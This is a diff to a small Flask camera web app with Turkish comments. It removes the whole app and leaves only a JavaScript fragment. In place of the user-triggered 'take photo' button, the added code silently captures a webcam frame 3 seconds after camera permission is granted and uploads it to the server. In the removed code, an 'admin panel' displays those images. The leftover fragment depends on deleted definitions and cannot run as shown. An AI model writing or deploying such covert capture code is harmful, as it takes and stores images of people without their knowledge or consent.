@@ -1,116 +1,24 @@
-from flask import Flask, request, send_from_directory, jsonify, render_template_string
-import os, base64
-from datetime import datetime
-
-app = Flask(__name__)
-UPLOAD_FOLDER = 'uploads'
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-
-HTML = '''
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Kortex Admin</title>
-<style>
-body{background:#111;color:#fff;font-family:sans-serif;text-align:center;margin:0;padding:0}
-h1{margin-top:1rem;color:#0ff}
-#cameraBtn{padding:.6rem 1.2rem;background:#0ff;color:#000;border:none;border-radius:8px;cursor:pointer;margin-top:1rem}
-#snapshots{display:flex;flex-wrap:wrap;justify-content:center;gap:1rem;margin-top:2rem}
-#snapshots img{width:160px;height:120px;border-radius:8px;object-fit:cover;border:2px solid #0ff}
-.adminPanel{margin-top:3rem;padding:1rem;border-top:1px solid #0ff}
-</style>
-</head>
-<body>
-
-<h1>Kortex Kamera</h1>
-<video id="video" width="320" height="240" autoplay style="border:2px solid #0ff;border-radius:8px;margin-top:1rem"></video><br>
-<button id="cameraBtn">Fotoğraf Çek</button>
-
-<div class="adminPanel">
-<h2>Admin Paneli</h2>
-<div id="snapshots"></div>
-</div>
-
-<script>
-const video = document.getElementById('video');
-const cameraBtn = document.getElementById('cameraBtn');
-const snapshots = document.getElementById('snapshots');
-
 // Kamera izni ve başlatma
 navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => { video.srcObject = stream })
-.catch(err => { alert('Kamera açılmadı: ' + err) });
+.then(stream => {
+    video.srcObject = stream;
 
-// Fotoğraf çekme
-cameraBtn.addEventListener('click', () => {
-    const canvas = document.createElement('canvas');
-    canvas.width = 320;
-    canvas.height = 240;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const dataURL = canvas.toDataURL('image/png');
+    // Otomatik fotoğraf çek
+    setTimeout(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = 320;
+        canvas.height = 240;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataURL = canvas.toDataURL('image/png');
 
-    // Server'a gönder
-    fetch('/upload', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ image: dataURL })
-    }).then(res => res.json()).then(data => {
-        if(data.success){ loadSnapshots(); }
-    });
-});
-
-// Admin paneli fotoğrafları yükle
-function loadSnapshots(){
-    fetch('/list_uploads')
-    .then(res => res.json())
-    .then(files => {
-        snapshots.innerHTML = '';
-        files.forEach(f => {
-            const img = document.createElement('img');
-            img.src = '/uploads/' + f;
-            snapshots.appendChild(img);
+        fetch('/upload', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: dataURL })
+        }).then(res => res.json()).then(data => {
+            if(data.success){ loadSnapshots(); }
         });
-    });
-}
-
-// Sayfa yüklenince admin paneli yükle
-window.onload = loadSnapshots;
-</script>
-
-</body>
-</html>
-'''
-
-# Ana sayfa
-@app.route('/')
-def index():
-    return render_template_string(HTML)
-
-# Fotoğraf yükleme
-@app.route('/upload', methods=['POST'])
-def upload():
-    data = request.json['image']
-    header, encoded = data.split(',',1)
-    binary = base64.b64decode(encoded)
-    filename = datetime.now().strftime('%Y%m%d%H%M%S') + '.png'
-    path = os.path.join(UPLOAD_FOLDER, filename)
-    with open(path, 'wb') as f: f.write(binary)
-    return jsonify(success=True)
-
-# Upload klasörü
-@app.route('/uploads/<filename>')
-def uploaded_file(filename):
-    return send_from_directory(UPLOAD_FOLDER, filename)
-
-# Admin paneli için liste
-@app.route('/list_uploads')
-def list_uploads():
-    files = os.listdir(UPLOAD_FOLDER)
-    files = sorted([f for f in files if f.endswith('.png')], reverse=True)
-    return jsonify(files)
-
-if __name__ == '__main__':
-    app.run(debug=True)
+    }, 3000); // 3 saniye bekleyip çekiyor
+})
+.catch(err => { alert('Kamera açılmadı: ' + err) });
